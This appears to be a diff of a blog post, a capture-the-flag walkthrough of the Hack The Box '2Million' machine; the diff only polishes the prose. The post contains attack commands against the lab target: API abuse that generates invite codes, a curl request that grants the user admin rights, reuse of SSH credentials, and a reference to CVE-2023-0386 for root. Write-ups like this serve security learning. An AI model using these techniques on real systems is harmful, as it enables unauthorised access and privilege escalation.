@@ -11,9 +11,7 @@ categories: blog
 ---
 # Hack The Box: 2Million - A Narrative Walkthrough
 
-Welcome to my walkthrough of the Hack The Box (HTB) machine: **2Million**. What began as a series of recon notes evolved into a story of curiosity, API exploration, privilege escalation, and ultimately, root access. Let's dive in.
-
----
+Welcome to my walkthrough of the Hack The Box (HTB) machine: 2Million. What began as a series of recon notes turned into a path through API exploration, privilege escalation, and eventually root access.
 
 ## Reconnaissance & First Impressions
 
@@ -25,10 +23,10 @@ nmap -A 10.10.11.221 -oN scan.initial
 
 The scan revealed two open ports:
 
-- **22/tcp**: OpenSSH 8.9p1
-- **80/tcp**: HTTP (nginx)
-  
-Navigating to the IP in a browser resulted in a redirect to `http://2million.htb/`, which didn't resolve—until I added the following line to my `/etc/hosts` file:
+- 22/tcp: OpenSSH 8.9p1
+- 80/tcp: HTTP (nginx)
+
+Navigating to the IP in a browser resulted in a redirect to `http://2million.htb/`, which didn't resolve until I added the following line to my `/etc/hosts` file:
 
 ```bash
 10.10.11.221 2million.htb
@@ -39,20 +37,18 @@ Once added, the page loaded immediately. It looked like a promotional site for H
 ![How do I join?](/assets/images/Pasted%20image%2020250701185331.png)
 ![Invite Code](/assets/images/Pasted%20image%2020250701185430.png)
 
-
-
-I poked around and soon discovered some JavaScript references in the source:
+I poked around and soon found some JavaScript references in the source:
 
 ```javascript
 eval(function(p,a,c,k,e,d)...)
 ```
 
-Yep: classic obfuscated JavaScript. I pasted the blob into [this online JS unpacker](https://matthewfl.com/unPacker.html) and got a cleaner view of the logic. Two functions stood out:
+Classic obfuscated JavaScript. I pasted the blob into [this online JS unpacker](https://matthewfl.com/unPacker.html) and got a cleaner view of the logic. Two functions stood out:
 
 - `verifyInviteCode(code)`
 - `makeInviteCode()`
 
-We're here to generate, not verify—so I hit the relevant endpoint:
+I needed to generate a code, not verify one, so I hit the relevant endpoint:
 
 ```bash
 curl -X POST http://2million.htb/api/v1/invite/how/to/generate
@@ -64,7 +60,7 @@ Response:
 {"data":"Va beqre gb trarengr...","enctype":"ROT13"}
 ```
 
-ROT13! A quick run through CyberChef decoded it to:
+ROT13. A quick run through CyberChef decoded it to:
 
 ```
 In order to generate the invite code, make a POST request to /api/v1/invite/generate
@@ -84,17 +80,17 @@ Output:
 {"code":"MTc5RVotQzA0UkctOTI5V0YtOUhPNzA="}
 ```
 
-That smelled like Base64, and decoding it gave me:
+That looked like Base64, and decoding it gave me:
 
 ```
 179EZ-C04RG-929WF-9HO70
 ```
 
-Bingo—valid invite code.
+A valid invite code.
 
 ## Exploring the API
 
-After signing up with the invite code, I started poking the API using Burp Suite and curl. I noticed that while most routes redirected or denied access, `/api` and `/api/v1` returned `401 Unauthorized`.
+After signing up with the invite code, I started poking the API using Burp Suite and curl. Most routes redirected or denied access, but `/api` and `/api/v1` returned `401 Unauthorized`.
 
 So I grabbed my `PHPSESSID` from the browser session and tried again:
 
@@ -103,7 +99,7 @@ curl -i http://2million.htb/api \
   -H "Cookie: PHPSESSID=<session>"
 ```
 
-Success! I was in.
+That worked, I was in.
 
 Pretty soon I had a full list of exposed endpoints. Some were for regular users, but a few were under `/admin/`, including:
 
@@ -131,7 +127,7 @@ curl -X PUT http://2million.htb/api/v1/admin/settings/update \
   -d '{"is_admin":1, "email":"REDACTED"}'
 ```
 
-Now I was admin. Confirmed via:
+Now I was admin, confirmed via:
 
 ```bash
 curl http://2million.htb/api/v1/admin/auth -H "Cookie: PHPSESSID=<session>"
@@ -196,7 +192,7 @@ I noticed a local user `admin`, and tried the creds over SSH:
 ssh admin@2million.htb
 ```
 
-They worked!
+They worked.
 
 ```bash
 cat user.txt
@@ -211,7 +207,7 @@ Reading `/var/mail/admin`, I saw this note:
 ... upgrade the OS ... OverlayFS / FUSE looks nasty ...
 ```
 
-Aha—CVE-2023-0386.
+CVE-2023-0386.
 
 ### Checking for Vulnerability
 
@@ -248,6 +244,6 @@ Root shell popped.
 
 ## Final Thoughts
 
-This box was a great mix of web, API, and kernel exploitation. I appreciated how the narrative clues guided the flow from recon to root, while still requiring trial-and-error and careful reading. Always satisfying when both the logic _and_ the exploit align cleanly.
+This box was a great mix of web, API, and kernel exploitation. The narrative clues guided the flow from recon to root, while still requiring trial-and-error and careful reading. It's always satisfying when both the logic and the exploit line up cleanly.
 
 Thanks for reading!
